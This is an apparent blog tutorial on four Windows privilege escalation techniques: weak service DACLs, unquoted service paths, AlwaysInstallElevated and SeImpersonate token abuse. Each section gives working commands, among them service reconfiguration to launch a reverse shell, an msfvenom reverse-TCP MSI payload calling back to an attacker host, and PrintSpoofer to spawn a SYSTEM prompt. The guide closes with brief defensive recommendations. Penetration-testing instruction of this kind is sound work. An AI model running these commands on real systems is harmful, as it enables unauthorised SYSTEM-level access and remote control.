---
title: "Windows Privilege Escalation Guide: Service Permissions, Unquoted Paths & Token Abuse"
author: parthpandey
categories: [Privilege-Escalation, Windows]
tags: [windows, privesc, unquoted-service-paths, dacl, accesschk, seimpersonate, printspoofer]
render_with_liquid: false
---

Privilege escalation on modern Windows operating systems requires understanding operating system internals: how the Service Control Manager (SCM) executes binaries, how access control lists (DACLs) restrict writes, and how token privileges can be manipulated to impersonate `NT AUTHORITY\SYSTEM`.

This guide outlines four core Windows privilege escalation vectors with practical commands and defense mechanisms.

---

## 1. Insecure Service Permissions (Weak DACLs)

Services configured with overly permissive Discretionary Access Control Lists (DACLs) permit low-privileged users to alter the binary path (`binPath`) directly.

### Enumeration with AccessChk
```cmd
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
```

If a service grants `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`:

### Exploitation
```cmd
sc config VulnerableService binpath= "C:\Temp\reverse_shell.exe"
sc stop VulnerableService
sc start VulnerableService
```

Upon restart, the Service Control Manager launches our reverse shell executable under the service's configured security account (typically `LocalSystem`).

---

## 2. Unquoted Service Paths

When a service binary path contains spaces and is not enclosed within quotation marks, Windows attempts to resolve each space-delimited segment as an executable candidate before loading the intended file.

### Identification
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Path Resolution Sequence
For an unquoted path such as `C:\Program Files\Vendor App\Service.exe`:
1. `C:\Program.exe`
2. `C:\Program Files\Vendor.exe`
3. `C:\Program Files\Vendor App\Service.exe`

### Subfolder DACL Check
Standard users cannot write to `C:\` due to default Windows root permissions. Check write access on intermediate subfolders:
```cmd
accesschk.exe /accepteula -uwdq "C:\Program Files\Vendor App"
```

If write access exists, drop the malicious executable:
```cmd
copy reverse.exe "C:\Program Files\Vendor App\Vendor.exe"
sc stop "VendorService"
sc start "VendorService"
```

---

## 3. Registry AlwaysInstallElevated Exploitation

When the `AlwaysInstallElevated` registry policy is enabled for both machine and user contexts, Windows Installer executes `.msi` packages with elevated `NT AUTHORITY\SYSTEM` permissions.

### Verification
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
*(Both keys must return `0x1`).*

### Crafting & Executing Payload
```bash
# On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o installer.msi
```

```cmd
# On Target Windows Host:
msiexec /quiet /qn /i C:\Temp\installer.msi
```

---

## 4. Token Impersonation (`SeImpersonatePrivilege`)

Accounts assigned `SeImpersonatePrivilege` (common for service accounts like `IIS APPPOOL\DefaultAppPool` or `NETWORK SERVICE`) can impersonate client tokens.

### Checking Privileges
```cmd
whoami /priv
```

If `SeImpersonatePrivilege` is marked `Enabled`:

### Exploitation with PrintSpoofer / GodPotato
PrintSpoofer exploits named pipe impersonation on the Windows Print Spooler service:
```cmd
PrintSpoofer64.exe -i -c cmd.exe
```

Immediate elevation to interactive `NT AUTHORITY\SYSTEM` prompt is achieved.

---

## Defensive Recommendations

1. **Quote All Service Paths**: Ensure all service binary paths are wrapped in double quotes in the Windows Registry (`HKLM\SYSTEM\CurrentControlSet\Services`).
2. **Strict Folder Permissions**: Restrict write permissions on application directories (`Program Files`) to Administrators only.
3. **Disable AlwaysInstallElevated**: Enforce Group Policy disabling elevated installer rights.
4. **Service Account Least Privilege**: Run enterprise services under virtual accounts or gMSAs with reduced privileges.
